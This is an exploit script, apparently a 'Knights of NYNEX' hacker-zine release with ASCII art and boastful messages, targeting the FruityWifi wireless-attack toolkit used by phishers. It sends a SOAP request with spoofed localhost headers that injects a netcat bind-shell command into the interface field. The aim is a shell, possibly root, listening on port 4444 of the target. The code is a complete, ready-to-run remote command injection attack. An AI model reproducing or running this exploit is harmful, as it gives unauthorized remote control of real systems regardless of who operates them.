#!/usr/bin/python3
# -*- coding: utf-8 -*-
# usage: ./akhlutprowlingterror.py http://phishingsiteurl
text='''
-o==[=====><=====]==o==[=====><=====]==o==[=====><=====]==o==[=====><=====]==o-
 
                                    ████
                                    ██████
                                    ██████
                                      ██
                                      ██
                ██████                ▓▓                  ██
                ██████                ██                ██████
                  ██▓▓                ██                ██████
                    ▓▓                ██                ▒▒
                    ██              ████                ▓▓
                    ██              ██████            ██▓▓
                    ████            ██████          ▓▓████                  ██
  ▓▓                ██████        ████████          ████▓▓                ██████
██████              ████████    ▓▓██████████      ████████                ██████
██████              ██████████████████████████████████████               ██
    ██            ▓▓██████████████████████████████████████              ██
      ██          ██████████████████████████████████████████          ████
      ████████▓▓████████████████████████████████████████████████████████
      ██████████████████████████████████████████████████████████████████
        ██████████████████████████████████████████████████████████████
        ██████████████████████████████████████████████████████████████
          █████████████████████ _  _ _ _   __  █████████████████████
          ████████▓▓           [|\|\\/[|\|[|-\\/          ▓▓████████
         .o oO0O0O0Oo              ''      `-''`                 O0Oo
         Ob.O0O0O0Oo  O0Oo.      oOOo.                      .adO0O0O0O
         OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
         OOP.oOOONOOOOOOO "OOOEGGSOOOOOo.   `"OOOOO4OOOP,OOOOOOOOYOUo'
         `O'O0OO'     `OO0Oo"O0O0O0O0O0O` .adO0O0O0O0O"oO0O'    `OO0Oo
         .O0OO'            `OOO0OO0OO0OO0OO0OO0OO0OO0O'            `OO
         OOOOO                 '"OOO0OO0OOO0OO0OO"`                oOO
        oOO0OOba.                .adOOOO0OOOOOba               .adOO0Oo.
       oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
      OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
      "O0OO"       "YOoOOKNIGHTSODOO"`  .   '"OOOONYNEXOOOoOY"     "O0O"
         Y           'OOOOOOOOOOOOOO: .oOFo. :OOOOOOOOOOO?'         :`
         :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
         .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                      '&o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                           `$"  `OOOO' `O"Y ' `OOOO'  o             .
         .                  .     OP"          : o     .
                                   :
                                   .                             4E 59 4E 45 58
            _
  _        | |
 | |_______|  \---------------------------------------------------------------\
 | |_______|  =[ The Knights of NYNEX presents: Akhlut prowling terror ]=======>
 |_|       |  /~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~/
           |_|
'''
m='''
"::::;;::::;;::::;;::::;;::::;;::::;;::::;;::::;;::::;;::::;;::::;;::::;;::::;;"
 
 
-o==[=====> META <=====]==o-
Is it a bird? is it a plane? No, it's a lame phisher about to get pwned!
 - https://github.com/xtr4nge/FruityWifi
 
 
-o==[=====> EXPLOIT <=====]==o-
'''
# Hope this isn't bug collision: https://github.com/xtr4nge/FruityWifi/issues/286
import requests
import sys
import time
print(text)
if (len(sys.argv) < 2):
    print("RTFM already!")
    exit(1)
print("Prowling the waters around "+sys.argv[1])
print("Caught the scent of a fruity phish")
time.sleep(2)
headers = {'content-type': 'text/xml','SOAPAction': 'urn:FruityWifi#setInterface','Client_ip': '127.0.0.1','X_FORWARDED_FOR': '127.0.0.1'}
body = """
    <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
    xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:FruityWifi">
    <soapenv:Header/><soapenv:Body><urn:setInterface soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <config xsi:type="xsd:string">i_internet</config>
    <interface xsi:type="xsd:string">pwnt\\"/' by";nc -e /bin/bash -lp 4444;echo knightsofnynex #</interface>
    </urn:setInterface></soapenv:Body></soapenv:Envelope>"""
print("Nighttime is best for hunting...")
time.sleep(2)
print("Hope you still see in the morning kid")
try:
    r = requests.post(sys.argv[1]+"wsdl/FruityWifi.php",data=body,headers=headers,timeout=3)
    if "You are not authorized" in r.content:
        print("Exploit failed!")
        exit(2)
except:
    print("Closer, closer, closer")
print("Spring the ambush! Sink our teet in!")
print("Crush their bones! eat their brains!")
time.sleep(2)
print("-o==[=====> The root shell should be listening on port 4444...")
print("-o==[=====> if it's not already root, you can sudo...\n")
print("H4CK THE PLANET!")
print("    HACK THE PLANET!")
print("        HACK THE PLANET!")
print("            HACK THE PLANET!")
print("                HACK THE PLANET!")
print("                    HACK THE PLANET!\n\n")
 
text='''
$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@$@
 
                              ⣀⣤⣶⣶⡶
                          ⣀⢴⣿⣿⣿⡿⠏
                       ⢀⢔⣾⣾⣿⣿⠟⠟
                     ⣠⣔⣽⣿⣿⣹⣿⡏⡌
          ⢀⣀⣀⢠⣤⣤⣤⣤⣤⣴⣿⣿⣿⣿⠏ ⣿⣿⣷⠆ ⣀⡠⣤⣶⣖⣛⣛⣻⣿⣿⣿⣿⣷⣶⡾⠛⠁
     ⣀⣤⣤⣶⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣄⡉⠉⠙ ⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣟⢿⣿⣿⣏ ⢄
  ⢠⢖⣽⣿⠟⡉  ⢀⣄⡹⣿⣿⣿⣿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣿⣿⣿⣴⣿⣿⣲⣄
 ⣰⣻⣿⣿⣗⣉⣠⣤⠾⠿⠿⣿⣿⣿⣿⢣⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⣀
 ⣿⣿⣿⣿⣿⣿⡿⠋⢀⠔ ⠈⠛⢿⣿⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏ ⢀⣀⣀⡀ ⣸⡿⠟⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⣖⣤⡀            ⢀⣠⣤⣰⣶⠶⠄
 ⣿⣿⣿⣿⣿⡿⠃⠴⠥⠤⠤⠤⠤⢀⡉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋  ⠛⠛⠛⢉⡉⣶⣾⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣻⣿⣿⣿⣿⣿⣿⣶⣦⣀       ⣠⣶⣿⣿⣿⣿⣟⡀
 ⢿⠿⠿⠿⠗⠔⠁       ⠈⠿⣮⣟⣿⣿⣿⣿⣿⣻⣏   ⠤⠐⠉  ⢿⣿⣿⣿⣿⣧⡈⠛⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣏⠉⢁⣘⠹⠿⠿⠿⠿⠿⠿⠿⠶⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⡀
                 ⣿⣿⣿⡟⢿⣿⣿⣿⣿         ⠙⠛⢿⣿⣿⣿      ⠈⠙⢿⣿⣿⣿⡆   ⠈⠉⠁  ⠈⠉⠉⠉   ⠙⠛⠛⠛⠛⠿⠛⠛⠛⠛
               ⢀⣾⣿⣿⠏ ⢸⣿⣿⣿⠇          ⣀⣴⣿⣿⡟        ⢈⣿⣿⣿⣿
             ⢀⣴⣿⣿⣿⠏ ⢀⣿⣿⣿⠏        ⢀⣾⣿⣿⣿⣿⠃       ⢰⣟⡿⣿⣿⣿⣿⡇
           ⣠⣴⣿⣿⣿⡿⠃⢀⣶⣿⣿⣿⣿         ⠈⠉⠁⠈⠉⠁        ⠈⠘⠂⢿⠘⣿⠋
           ⠋⠉⠉⠉⠉ ⣜⣻⣿⣿⣿⣿⠏
                  ⠸⠋⠿⠋
 
 
-o==[=====> GOODBYE <=====]==o-
This is the last issue of KoN, at least in its current format. Lets be honest
there is only so much you can do with phishing tools unless you target the
shoddy corporate ones run by retired criminals and we're not zf0.
Shout out to everyone who inspired, contributed and supported us, they are too
many to mention, but especially @mubix, @laughing_mantis and @hackerscurator
 
So long, and thanks for all the phish!!!! !!
 
 
-o==[=====> SIG <=====]==o-
0034003200b153e3007653d825a89b24309761747489079a3982b3dc27d45c0146800237c3097651
b46d07be340034003200373ed0fa2bb4c022919d5c6c6c6d17327284cc7e3f642ebf19c371f15297
aaddf58f56389247bbbd0034003200a965f98db196490071fcc90292201721e3cb442e4164616d73
b6c417378dfcd82900ac2cf080d87c0034003200469fd63fd5f7fc590ffdc40e161d2b8b60937a39
60f33318b95bb1fccbbadc72af21f9e4f3928d4e0034003200158650bf32791bf8e2eba5de614fd6
c9e1a02ed591190450086e688364e9b777b4bfb6cfc06dab03003400320071c36fc094a0303ae81b
7c4bd57815d25f4c3febba5fd73e81f434fd0184f89ba8edfdcc69a57b520034003200291f55b92b
225049725dd6a99297c808db137243da077f82f456539e8c3c545f491c0336b2e15083bb0f47d478
'''
 
#  0day.today [2022-04-16]  #